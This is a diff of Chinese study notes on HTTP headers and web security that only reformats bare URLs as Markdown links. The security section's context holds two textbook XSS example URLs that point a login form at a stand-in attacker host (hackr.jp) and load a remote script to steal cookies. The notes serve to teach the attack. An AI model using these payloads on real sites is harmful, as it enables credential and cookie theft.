@@ -665,14 +665,14 @@ TE会告知服务器客户端能够处理响应的<font color=red>传输编码</
 
 <font color=orange>TE其实和Transer-Encoding有大的关系？？？</font>
 
-https://blog.csdn.net/weixin_39843989/article/details/101225414
+[https://blog.csdn.net/weixin_39843989/article/details/101225414](https://blog.csdn.net/weixin_39843989/article/details/101225414)
 
 - 内容编码时在传输前进行的，一般是为了对实体主体进行压缩
 - 传输编码是在传输过程中进行编码，在内容编码的基础上，可以继续对实体主体进行传输编码，使其可以分块传输，也可以不进行分块传输编码直接一次性进行完整传输
 
 TE除指定传输编码之外，还可以指定伴随trailer字段的分块传输编码的方式。应用后者时，只需把trailers赋值给改字段值。
 
-https://www.zhihu.com/question/346022586
+[https://www.zhihu.com/question/346022586](https://www.zhihu.com/question/346022586)
 
 ```
 TE: trailers
@@ -886,7 +886,7 @@ Accept-Ranges: bytes
 
 与Date：Date是创建请求时的时间，Age是推算响应话费的时间（单位为秒）
 
-https://cloud.tencent.com/developer/section/1189902
+[https://cloud.tencent.com/developer/section/1189902](https://cloud.tencent.com/developer/section/1189902)
 
 Age header 包含以秒计的对象一直在代理缓存的时间。
 
@@ -1275,7 +1275,7 @@ P3P: CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS I
 
 ## 编码总结
 
-https://blog.csdn.net/weixin_39843989/article/details/101225414
+[https://blog.csdn.net/weixin_39843989/article/details/101225414](https://blog.csdn.net/weixin_39843989/article/details/101225414)
 
 1. <font color=red>https</font>是最外层编码，指出是否应当<font color=gree>加密</font>。
 
@@ -1572,7 +1572,7 @@ Web应用安全对策大致分为两部分：
   比如在url中传递脚本、或者黑客提交了脚本后没有经过检测、转义直接注入到网站上（安全漏洞），给黑客提供了伪造的时机。
 
   ```
-  http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script>
+  [http://example.jp/login?ID=](http://example.jp/login?ID=)"><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script>
   ```
 
   ```html
@@ -1601,7 +1601,7 @@ Web应用安全对策大致分为两部分：
   除了在表单处设下圈套，还可以窃取Cookie，注入下面的脚本
 
   ```
-  http://example.jp/login?ID="<script src=http://hackr.jp/xss.js></script>
+  [http://example.jp/login?ID=](http://example.jp/login?ID=)"<script src=http://hackr.jp/xss.js></script>
   ```
 
   
